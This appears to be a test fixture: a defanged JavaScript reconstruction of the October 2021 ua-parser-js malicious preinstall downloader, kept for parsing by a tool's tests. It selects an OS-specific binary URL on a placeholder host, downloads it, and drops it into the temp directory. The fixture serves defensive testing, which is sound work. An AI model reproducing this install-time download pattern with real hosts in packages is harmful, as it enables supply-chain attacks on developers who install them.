// DEFANGED RECONSTRUCTION of the ua-parser-js preinstall downloader (October 2021), modeled on public incident analyses
// (see test/fixtures/reconstructions/inventory.json). Synthetic, not the original artifact.
// Parsed by capdelta tests only; never imported, installed, or executed.
// Kept: the OS check, the platform-specific download, and the local drop.
// Omitted: the real hosts, the real miner binaries, and every call.
const fs = require("node:fs");
const os = require("node:os");
const path = require("node:path");
const https = require("node:https");

const downloads = {
  win32: "https://downloads.example.invalid/build/win32.exe",
  darwin: "https://downloads.example.invalid/build/darwin",
  linux: "https://downloads.example.invalid/build/linux",
};

function install() {
  const url = downloads[os.platform()] ?? downloads.linux;
  https.get(url, (response) => {
    const chunks = [];
    response.on("data", (chunk) => chunks.push(chunk));
    response.on("end", () => {
      fs.writeFileSync(
        path.join(os.tmpdir(), "capdelta-fixture-agent"),
        Buffer.concat(chunks),
      );
    });
  });
}

module.exports = { install };
